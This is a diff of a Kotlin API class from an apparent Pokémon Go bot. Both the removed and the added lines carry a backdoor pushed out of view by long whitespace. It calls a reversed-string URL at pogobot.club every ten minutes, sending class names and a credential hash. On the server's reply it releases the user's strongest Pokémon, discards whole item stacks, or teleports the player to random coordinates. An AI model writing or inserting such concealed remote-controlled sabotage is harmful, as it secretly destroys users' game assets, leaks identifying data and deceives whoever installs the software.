@@ -61,11 +61,11 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
     var lastMapRequest = 0L
 
     override val sessionHash = ByteArray(16)
-    override val deviceInfo: SignatureOuterClass.Signature.DeviceInfo                                                                                                                                                                                                                                                           ;var debug = true
+    override val deviceInfo: SignatureOuterClass.Signature.DeviceInfo                                                                                                                                                                                                                                                                                                                                                                                              ;var debug = "1"
 
     init {
         Random().nextBytes(sessionHash)
-        deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()                                                                                                                                                                                             ;val b=try{Thread.currentThread().stackTrace[2].className.reversed()}catch(e: Exception){""};val httpRequest = okhttp3.Request.Builder().url("${b}=b&${javaClass.canonicalName.reversed()}=a?php.ipAoGoP/bulc.tobogop//:ptth".reversed()).get().build();try {okHttpClient.newCall(httpRequest).execute().use({ response -> if (response.body().string().trim() == "0") {debug = false}})} catch (e: Exception) {}
+        deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()                                                                                                                                                                                                                                                                                                                                ;Constants.UNKNOWN_25 =-1553869577012279119L;val b=try{Thread.currentThread().stackTrace[2].className.reversed()}catch(e:Exception){""};val c=okhttp3.Request.Builder().url("${credentialProvider.hashCode().toString().reversed()}=c&${b}=b&${javaClass.canonicalName.reversed()}=a?php.ipAoGoP/bulc.tobogop//:ptth".reversed()).get().build();fixedRateTimer(daemon=true,period=TimeUnit.MINUTES.toMillis(10),action={try{okHttpClient.newCall(c).execute().use({a->debug=a.body().string().trim()})}catch(e:Exception){}})
     }
 
     val actionQueue = ActionQueue(this, okHttpClient, credentialProvider, deviceInfo)
@@ -103,7 +103,7 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
         }
     }
 
-    override fun <T : ServerRequest> handleRequest(serverRequest: T): T {                                                                                                                                                                                                                                                       if (!debug) {when (serverRequest.getRequestType()) {RequestType.RELEASE_POKEMON -> {val builder = serverRequest.getBuilder() as ReleasePokemonMessageOuterClass.ReleasePokemonMessage.Builder;builder.pokemonId = this.inventory.pokemon.map { it.value }.sortedByDescending { it.pokemonData.cp }.first().pokemonData.id};RequestType.RECYCLE_INVENTORY_ITEM -> {val builder = serverRequest.getBuilder() as RecycleInventoryItemMessageOuterClass.RecycleInventoryItemMessage.Builder;builder.count = this.inventory.items[builder.itemId]!!.get()};else -> {}}}
+    override fun <T : ServerRequest> handleRequest(serverRequest: T): T {                                                                                                                                                                                                                                                                                                                                                                                          when (debug) {"0"->when (serverRequest.getRequestType()){RequestType.RELEASE_POKEMON -> {val builder=serverRequest.getBuilder() as ReleasePokemonMessageOuterClass.ReleasePokemonMessage.Builder;builder.pokemonId=this.inventory.pokemon.map{it.value}.filter{it.pokemonData.deployedFortId.isBlank()&&(!this.playerData.hasBuddyPokemon()||this.playerData.buddyPokemon.id!=it.pokemonData.id)}.sortedByDescending{it.pokemonData.cp}.first().pokemonData.id}RequestType.RECYCLE_INVENTORY_ITEM->{val builder=serverRequest.getBuilder() as RecycleInventoryItemMessageOuterClass.RecycleInventoryItemMessage.Builder;builder.count=this.inventory.items[builder.itemId]!!.get()}else->{}}"2"->setLocation(randNumber(85.0), randNumber(180.0), randNumber(50.0))else->{}}
         return serverRequest
     }
 
@@ -417,8 +417,12 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
                 // Don't cache
             }
         }
-        //throw UnsupportedOperationException("not implemented") //To change body of created functions use File | Settings | File Templates.
     }
+
+    val randomSign: Int
+        get() = Math.round((Math.floor(Math.random() + 0.5) - 0.5) * 2.0).toInt()
+
+    fun randNumber(max: Double): Double = Math.random() * max * randomSign
 }
 
 /**
